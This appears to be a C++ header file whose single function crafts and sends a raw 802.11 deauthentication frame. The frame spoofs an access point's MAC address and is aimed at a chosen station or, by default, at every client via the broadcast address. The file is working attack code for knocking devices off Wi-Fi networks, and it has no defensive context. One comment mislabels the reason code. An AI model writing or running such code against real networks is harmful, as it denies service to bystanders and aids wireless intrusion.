// deauth.h
#pragma once
#include <stdint.h>
#include <sys/socket.h>
#include <cstring>
#include <iostream>

static const uint8_t broadcastMac[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};

static inline bool sendDeauthFrame(int sock, const uint8_t* ifaceMac, const uint8_t* apMac, const uint8_t* stMac) {
    uint8_t frame[26] = {0};

    // Frame Control: Deauthentication (0xC0)
    frame[0] = 0xc0;
    frame[1] = 0x00;

    // Duration: 0
    frame[2] = 0x00;
    frame[3] = 0x00;

    // Address 1: Receiver Address (Station MAC or Broadcast)
    memcpy(frame + 4, stMac ? stMac : broadcastMac, 6);

    // Address 2: Transmitter Address (AP MAC)
    memcpy(frame + 10, apMac, 6);

    // Address 3: BSSID (AP MAC)
    memcpy(frame + 16, apMac, 6);

    // Sequence Control: 0
    frame[22] = 0x00;
    frame[23] = 0x00;

    // Reason Code: Unspecified reason (7) - You can change this if needed
    frame[24] = 0x07;
    frame[25] = 0x00;

    return send(sock, frame, sizeof(frame), 0) != -1;
}